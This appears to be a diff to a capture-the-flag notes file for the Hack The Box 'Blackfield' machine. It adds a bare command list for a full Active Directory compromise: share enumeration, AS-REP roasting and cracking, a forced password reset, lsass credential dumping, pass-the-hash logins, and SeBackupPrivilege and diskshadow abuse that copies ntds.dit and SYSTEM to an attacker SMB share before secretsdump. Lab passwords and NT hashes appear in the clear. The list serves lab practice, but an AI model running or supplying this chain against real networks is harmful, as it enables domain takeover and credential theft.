@@ -1,6 +1,61 @@
 ```
 nmap -sS -sC -sV -T5 -Pn 10.10.10.192
 nmap -sU -T5 10.10.10.192
+smbclient -L \\\\10.10.10.192\\
+smbclient \\\\10.10.10.192\\profiles$
+RECURSE ON
+PROMPT OFF
+mget *
+ls -la | awk -F' ' '{print $9}' > users2.txt
+./kerbrute_linux_amd64 userenum --dc 10.10.10.192 -d BLACKFIELD.local /home/itsec/Documents/HTB-Blackfield/users2.txt
+crackmapexec smb 10.10.10.192 -u users1.txt -p /usr/share/wordlists/rockyou.txt
+smbclient -L \\\\10.10.10.192\\ -U BLACKFIELD.local/audit2020@BLACKFIELD.local
+./GetNPUsers.py blackfield.local/ -no-pass -usersfile users1.txt -dc-ip 10.10.10.192
+john hash1 -w=/usr/share/wordlists/rockyou.txt
+neo4j console
+bloodhound
+git clone https://github.com/dirkjanm/BloodHound.py.git
+python3 bloodhound.py -d BLACKFIELD.local -u support -p '#00^BlackKnight' -ns 10.10.10.192 -c All
+Raw Query: MATCH p=(u {owned: true})-[r1]->(n) WHERE r1.isacl=true RETURN p
+rpcclient -U blackfield/support 10.10.10.192
+setuserinfo audit2020 23 H@CKTHEB0X#
+crackmapexec smb 10.10.10.192 -u audit2020 -p H@CKTHEB0X# --shares
+smbclient \\\\10.10.10.192\\forensic -U BLACKFIELD.local/audit2020
+mget *
+pypykatz lsa minidump lsass.DMP
+pypykatz lsa minidump lsass.DMP | grep 'NT:' | awk '{ print $2 }' | sort -u > hashes2
+pypykatz lsa minidump lsass.DMP | grep 'Username:' | awk '{ print $2 }' | sort -u > users2
+crackmapexec smb 10.10.10.192 -u users2 -H hashes2
+evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
+whoami /priv
+robocopy /b C:\Users\Administrator\Desktop\ C:\
+git clone https://github.com/giuliano108/SeBackupPrivilege.git
+cd C:\programdata
+upload SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
+upload SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
+import-module .\SeBackupPrivilegeCmdLets.dll
+import-module .\SeBackupPrivilegeUtils.dll
+cd C:\windows\system32\config
+type netlogon.dns
+Copy-FileSeBackupPrivilege netlogon.dns \programdata\netlogon.dns
+type \programdata\netlogon.dns
+Copy-FileSeBackupPrivilege \users\administrator\desktop\root.txt 0xdf.txt
+Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit .
+https://pentestlab.blog/tag/diskshadow/
+unix2dos vss.dsh
+upload vss.dsh c:\programdata\vss.dsh
+diskshadow /s c:\programdata\vss.dsh
+./smbserver.py s . -smb2support -username df -password df
+net use \\10.10.14.13\s /u:df df
+Copy-FileSeBackupPrivilege z:\Windows\ntds\ntds.dit \\10.10.14.13\s\ntds.dit
+Copy-FileSeBackupPrivilege z:\Windows\system32\config\SYSTEM \\10.10.14.6\s\SYSTEM
+./secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL
+evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee
+```
+
+```
+nmap -sS -sC -sV -T5 -Pn 10.10.10.192
+nmap -sU -T5 10.10.10.192
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/fbd9d1ba-1de4-40ac-9315-7e4696e0411e)
 
